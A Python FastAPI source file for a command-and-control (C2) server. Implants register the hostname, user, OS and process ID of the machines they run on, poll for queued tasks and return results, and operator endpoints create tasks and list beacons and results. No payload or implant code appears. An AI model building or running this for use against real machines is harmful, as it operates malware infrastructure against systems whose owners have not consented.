import json
import uuid
from contextlib import asynccontextmanager

from fastapi import FastAPI, HTTPException

from .db import db, init_db, utcnow
from .models import BeaconRegistration, TaskCreate, TaskResult


@asynccontextmanager
async def lifespan(app: FastAPI):
    init_db()
    yield


app = FastAPI(title="C2 Server", lifespan=lifespan)


# ── Beacon endpoints (called by implant) ─────────────────────────────────────

@app.post("/beacon/register")
def register_beacon(info: BeaconRegistration):
    beacon_id = str(uuid.uuid4())
    with db() as conn:
        conn.execute(
            "INSERT INTO beacons VALUES (?,?,?,?,?,?)",
            (beacon_id, info.hostname, info.username, info.os, info.pid, utcnow()),
        )
    return {"beacon_id": beacon_id}


@app.get("/beacon/{beacon_id}/tasks")
def poll_tasks(beacon_id: str):
    with db() as conn:
        row = conn.execute(
            "SELECT beacon_id FROM beacons WHERE beacon_id=?", (beacon_id,)
        ).fetchone()
        if not row:
            raise HTTPException(status_code=404, detail="Unknown beacon")

        conn.execute(
            "UPDATE beacons SET last_seen=? WHERE beacon_id=?", (utcnow(), beacon_id)
        )
        rows = conn.execute(
            "SELECT task_id, type, params FROM tasks WHERE beacon_id=? AND status='pending'",
            (beacon_id,),
        ).fetchall()
        task_ids = [r["task_id"] for r in rows]
        if task_ids:
            placeholders = ",".join("?" * len(task_ids))
            conn.execute(
                f"UPDATE tasks SET status='dispatched' WHERE task_id IN ({placeholders})",
                task_ids,
            )

    tasks = [
        {"task_id": r["task_id"], "type": r["type"], "params": json.loads(r["params"])}
        for r in rows
    ]
    return {"tasks": tasks}


@app.post("/results")
def post_result(result: TaskResult):
    with db() as conn:
        conn.execute(
            "INSERT INTO results VALUES (?,?,?,?,?,?,?)",
            (
                str(uuid.uuid4()),
                result.task_id,
                result.beacon_id,
                result.status,
                result.output,
                json.dumps(result.telemetry),
                result.completed_at,
            ),
        )
        conn.execute(
            "UPDATE tasks SET status=? WHERE task_id=?",
            (result.status, result.task_id),
        )
    return {"ok": True}


# ── Operator endpoints (called by CLI) ───────────────────────────────────────

@app.post("/tasks")
def create_task(task: TaskCreate):
    task_id = str(uuid.uuid4())
    with db() as conn:
        row = conn.execute(
            "SELECT beacon_id FROM beacons WHERE beacon_id=?", (task.beacon_id,)
        ).fetchone()
        if not row:
            raise HTTPException(status_code=404, detail="Unknown beacon_id")
        conn.execute(
            "INSERT INTO tasks VALUES (?,?,?,?,?,'pending')",
            (task_id, task.beacon_id, task.type, json.dumps(task.params), utcnow()),
        )
    return {"task_id": task_id}


@app.get("/beacons")
def list_beacons():
    with db() as conn:
        rows = conn.execute("SELECT * FROM beacons ORDER BY last_seen DESC").fetchall()
    return {"beacons": [dict(r) for r in rows]}


@app.get("/results")
def list_results():
    with db() as conn:
        rows = conn.execute(
            "SELECT * FROM results ORDER BY completed_at DESC LIMIT 100"
        ).fetchall()
    results = []
    for r in rows:
        d = dict(r)
        d["telemetry"] = json.loads(d["telemetry"])
        results.append(d)
    return {"results": results}
